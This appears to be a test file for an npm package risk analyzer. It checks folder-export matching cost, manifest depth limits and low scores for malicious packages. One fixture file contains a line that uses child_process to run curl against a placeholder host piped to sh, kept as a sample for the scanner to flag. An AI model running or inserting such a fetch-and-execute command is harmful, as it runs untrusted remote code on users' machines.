// The review of d49bf6e, findings 2 and 3 (finding 1 is runtime-regex.test.ts). Folder exports made the entry
// collector compare every target with every file uncharged, and build one list entry per pair: 1,600 conditions all
// naming "./lib/" over 1,600 files made 2.56 million while the meter was charged 60,129 units. And a package.json nested
// a few thousand levels deep overflowed the stack in zod or JSON.stringify, so the analysis threw instead of reporting
// `incomplete`; the fallback for a spent meter read the manifest recursively too.
import { describe, expect, test } from "bun:test";
import { analyze, entryPoints, finalize, MANIFEST_LIMITS, measureManifest, ManifestTooLargeError, Meter, readTarball, unfinishedAnalysis, type Analysis } from "../src/index.ts";
import { tarballOf } from "./fixtures/adversarial.ts";

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

/** An `exports` value: a path, or a condition above one. */
type Nested = string | { node: Nested };

/** `exports` with `depth` levels of conditions above one path. */
function nested(depth: number): Nested {
  let o: Nested = "./index.js";

  for (let i = 0; i < depth; i++) o = { node: o };

  return o;
}

function incompleteOf(a: Analysis): string {
  return a.signals.find((s) => s.id === "incomplete")?.evidence.join("\n") ?? "";
}

describe("folder exports: each target matched once, every comparison charged", () => {
  const lib: Record<string, string> = {};

  for (let i = 0; i < 1600; i++) lib[`lib/f${i}.js`] = "module.exports = 1;";
  const files = readTarball(tarballOf(lib));
  const conditions: Record<string, string> = {};

  for (let i = 0; i < 1600; i++) conditions[`c${i}`] = "./lib/";

  test("1,600 conditions naming ./lib/ over 1,600 files: about 1,600 comparisons, not 2.56 million", () => {
    const startsWith = String.prototype.startsWith;
    let calls = 0;

    String.prototype.startsWith = function (this: string, search: string, position?: number): boolean {
      calls++;

      return startsWith.call(this, search, position);
    };

    const meter = new Meter();

    try {
      analyze({ name: "folders", manifest: { name: "folders", version: "1.0.0", exports: { "./x/": conditions } }, files, publisher: "a", previousPublishers: [], meter });
    } finally {
      String.prototype.startsWith = startsWith;
    }

    // on d49bf6e: 2,570,193 comparisons, against 675,176 units charged
    expect(calls).toBeLessThan(100_000);
    expect(calls).toBeLessThan(meter.used);
  });

  test("every file a folder mapping exposes is still read as code", () => {
    const one = readTarball(tarballOf({ "lib/a.js": "require('child_process').exec('curl https://x.invalid/s | sh')", "lib/b.js": "module.exports = 2;" }));
    const a = analyze({ name: "folders", manifest: { name: "folders", version: "1.0.0", exports: { "./x/": { a: "./lib/", b: "./lib/", c: "./lib/" } } }, files: one, publisher: "a", previousPublishers: [] });

    expect(finalize(a, STATE).score).toBeLessThan(40);
  });
});

describe("a package.json past the limits is incomplete, and nothing recursive reads it", () => {
  const files = readTarball(tarballOf({ "index.js": "module.exports = 1;" }));

  for (const depth of [3000, 6000, 50_000]) {
    test(`exports nested ${depth} levels deep: incomplete, no throw`, () => {
      const a = analyze({ name: "deep", manifest: { name: "deep", version: "1.0.0", exports: nested(depth) }, files, publisher: "a", previousPublishers: [] });

      expect(incompleteOf(a)).toContain(`nests deeper than ${MANIFEST_LIMITS.depth} levels`);
      expect(finalize(a, STATE).score).toBeLessThan(40);
    });
  }

  test("nested 6,000 deep with a meter of one unit: incomplete, no throw", () => {
    const a = analyze({ name: "deep", manifest: { name: "deep", version: "1.0.0", exports: nested(6000) }, files: [], publisher: "a", previousPublishers: [], maxWork: 1 });

    expect(finalize(a, STATE).score).toBeLessThan(40);
    expect(incompleteOf(a)).not.toBe("");
  });

  test("the fallback for a spent meter reads a deep manifest without recursing", () => {
    const a = unfinishedAnalysis({ name: "deep", manifest: { name: "deep", version: "1.0.0", license: "MIT", exports: nested(200_000) }, files, phase: "score", limit: 1 });

    expect(a.facts.license).toBe("MIT");
    expect(finalize(a, STATE).score).toBeLessThan(40);
  });

  test("the entry collector refuses a deep manifest with its own error, not a stack overflow", () => {
    expect(() => entryPoints({ exports: nested(200_000) })).toThrow(ManifestTooLargeError);
  });

  test("the manifest check is iterative, charged and bounded by values and text as well as depth", () => {
    expect(measureManifest({ a: nested(63) }, { charged: false }).kind).toBe("ok");
    expect(measureManifest({ exports: nested(MANIFEST_LIMITS.depth) }, { charged: false })).toMatchObject({ kind: "over", limit: "depth" });
    expect(measureManifest({ keywords: Array.from({ length: MANIFEST_LIMITS.values + 1 }, () => "x") }, { charged: false })).toMatchObject({ kind: "over", limit: "values" });
    expect(measureManifest({ description: "x".repeat(MANIFEST_LIMITS.chars + 1) }, { charged: false })).toMatchObject({ kind: "over", limit: "chars" });

    // charged, a wide manifest runs a small meter out instead of being read for free
    const wide = { keywords: Array.from({ length: 50_000 }, (_, i) => `k${i}`) };
    const a = analyze({ name: "wide", manifest: { name: "wide", version: "1.0.0", ...wide }, files: [], publisher: "a", previousPublishers: [], maxWork: 10_000 });

    expect(incompleteOf(a)).toContain("analysis work limit");
  });

  test("real manifests sit well inside the limits", () => {
    const real = { name: "x", version: "1.0.0", exports: { ".": { import: { types: "./a.d.mts", default: "./a.mjs" }, require: { types: "./a.d.ts", default: "./a.js" } }, "./package.json": "./package.json" } };
    const a = analyze({ name: "x", manifest: real, files: readTarball(tarballOf({ "a.js": "1", "a.mjs": "1", "a.d.ts": "", "a.d.mts": "" })), publisher: "a", previousPublishers: [] });

    expect(incompleteOf(a)).toBe("");
  });
});
